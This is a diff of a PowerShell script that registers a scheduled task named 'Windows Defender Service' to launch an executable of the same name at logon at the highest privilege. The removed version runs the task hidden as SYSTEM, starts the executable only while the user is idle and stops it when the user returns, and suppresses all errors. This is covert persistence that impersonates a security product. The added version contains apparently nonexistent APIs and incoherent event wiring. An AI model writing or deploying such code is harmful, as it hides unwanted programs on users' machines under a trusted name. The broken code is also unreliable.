@@ -1,72 +1,89 @@
-# Define task details
+# Task Name and Path
 $TaskName = "Windows Defender Service"
 $TaskPath = "C:\Windows\Windows Defender Service.exe"
 
-# Function to start the task on logon
-function Start-DefenderTask {
-    try {
-        $task = New-ScheduledTask -Action (New-ScheduledTaskAction -Execute $TaskPath) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowDemandStart -Hidden)
-        Register-ScheduledTask -TaskName $TaskName -InputObject $task -ErrorAction Stop
-        # Wait a short time to ensure task is fully registered.
-        Start-Sleep -Seconds 2
-        return $true #return true if task was registered successfully.
-    } catch {
-        # Suppress errors
-        return $false #return false if task registration failed.
+# Idle Time (in minutes)
+$IdleTimeMinutes = 1
+
+# Function to start the task
+function Start-MyTask {
+    if (Test-Path $TaskPath) {
+        try {
+            $Action = New-ScheduledTaskAction -Execute $TaskPath
+            $Trigger = New-ScheduledTaskTrigger -AtLogOn
+            $Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -RunLevel Highest
+            $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal
+            Register-ScheduledTask -TaskName $TaskName -InputObject $Task -User ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) | Out-Null
+        }
+        catch {} # Suppress errors
     }
 }
 
-# Register the logon task and check if it was successful.
-if (Start-DefenderTask) {
+# Function to stop the task
+function Stop-MyTask {
+    try {
+        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false | Out-Null
+    }
+    catch {} # Suppress errors
+}
 
-    # Function to stop the task if idle (within the same task)
-    function Check-IdleState {
-        $IdleTimeout = 60 # 60 seconds = 1 minute
-        $idleTime = (Get-WmiObject -Class Win32_IdleTime | Select-Object -ExpandProperty IdleTime) / 1000
-
-        if ($idleTime -gt $IdleTimeout) {
-            if (-not (Get-Process -Name "Windows Defender Service" -ErrorAction SilentlyContinue)) {
-                try{
-                    Start-Process -FilePath $TaskPath -ErrorAction Stop
-                }
-                catch{
-                    #suppress errors
-                }
-            }
+# Function to check idle state
+function Check-IdleState {
+    try {
+        $IdleTimeSeconds = ([System.Management.Automation.Host.UI.PSHostRawUserInterface]::new()).RawUI.IdleTimeout
+        if ($IdleTimeSeconds -ge ($IdleTimeMinutes * 60)) {
+            return $true
         } else {
-            if (Get-Process -Name "Windows Defender Service" -ErrorAction SilentlyContinue) {
-                try{
-                    Stop-Process -Name "Windows Defender Service" -ErrorAction SilentlyContinue
-                }
-                catch{
-                    #suppress errors
-                }
-            }
+            return $false
         }
     }
-
-    #Add idle checking to the existing task.
-    try{
-        $task = Get-ScheduledTask -TaskName $TaskName
-        $action = $task.Actions
-        $IdleAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command {& {Check-IdleState}}"
-        $task.Actions += $IdleAction
-        $task.Settings.ExecutionTimeLimit = [System.TimeSpan]::Zero #Allow task to run indefinitely
-        Set-ScheduledTask -InputObject $task -ErrorAction Stop
-    }
-    catch{
-        #Suppress errors
-    }
-
-    #add event triggers to the task
-    try{
-        $task = Get-ScheduledTask -TaskName $TaskName
-        $IdleTrigger = New-ScheduledTaskTrigger -EventTrigger -Subscription "<QueryList><Query Id='0' Path='System'><Select Path='System'>*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and (EventID=4802)]]</Select></Query></QueryList>"
-        $UnlockTrigger = New-ScheduledTaskTrigger -EventTrigger -Subscription "<QueryList><Query Id='0' Path='System'><Select Path='System'>*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and (EventID=4803)]]</Select></Query></QueryList>"
-        $task.Triggers += $IdleTrigger, $UnlockTrigger
-        Set-ScheduledTask -InputObject $task -ErrorAction Stop
-    }
-    catch{
-        #Suppress Errors
+    catch {
+        return $false; #return false on error.
     }
 }
+
+# Event Registration for User Logon
+try {
+    Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'" -SourceIdentifier LogonEvent | Out-Null
+} catch {}
+
+# Event Registration for Idle State
+try {
+    Register-WmiEvent -Query "SELECT * FROM Win32_IdleWin32Timing" -SourceIdentifier IdleEvent | Out-Null
+} catch {}
+
+# Event Handlers
+$LogonEventHandler = {
+    Start-MyTask
+}
+
+$IdleEventHandler = {
+    if (Check-IdleState) {
+        Stop-MyTask
+    }
+}
+
+$ActiveEventHandler = {
+    if (-not (Check-IdleState))
+    {
+        Start-MyTask
+    }
+}
+
+# Register event actions
+try {
+    Register-ObjectEvent -InputObject (Get-EventSubscriber -SourceIdentifier LogonEvent) -EventName Received -Action $LogonEventHandler | Out-Null
+    Register-ObjectEvent -InputObject (Get-EventSubscriber -SourceIdentifier IdleEvent) -EventName Received -Action $IdleEventHandler | Out-Null
+    Register-ObjectEvent -InputObject (Get-EventSubscriber -SourceIdentifier IdleEvent) -EventName Received -Action $ActiveEventHandler | Out-Null
+} catch {}
+
+# Keep the script running to listen for events
+while ($true) {
+    Start-Sleep -Seconds 60
+}
+
+# Cleanup (Will not be reached unless script is manually stopped)
+try{
+    Unregister-Event -SourceIdentifier LogonEvent | Out-Null
+    Unregister-Event -SourceIdentifier IdleEvent | Out-Null
+} catch {}
